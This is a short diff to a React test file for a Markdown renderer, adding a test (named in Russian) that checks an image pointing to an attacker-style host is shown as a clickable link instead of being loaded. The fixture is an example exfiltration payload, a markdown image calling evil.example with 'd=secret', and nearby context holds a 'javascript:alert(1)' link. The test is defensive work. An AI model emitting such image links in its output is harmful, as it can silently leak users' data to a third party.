@@ -98,6 +98,14 @@ describe('Markdown', () => {
     expect(openUrl).toHaveBeenCalledTimes(1)
   })
 
+  it('картинка не загружается — вместо неё ссылка с подписью', () => {
+    const { container } = render(<Markdown text={'![схема](https://evil.example/x.png?d=secret)'} />)
+    expect(container.querySelector('img')).toBeNull()
+    const a = screen.getByRole('link', { name: /схема/ })
+    expect(fireEvent.click(a)).toBe(false)
+    expect(openUrl).toHaveBeenCalledWith('https://evil.example/x.png?d=secret')
+  })
+
   it('ссылки javascript: не открываются', () => {
     render(<Markdown text={'[x](javascript:alert(1))'} />)
     const a = screen.getByText('x')
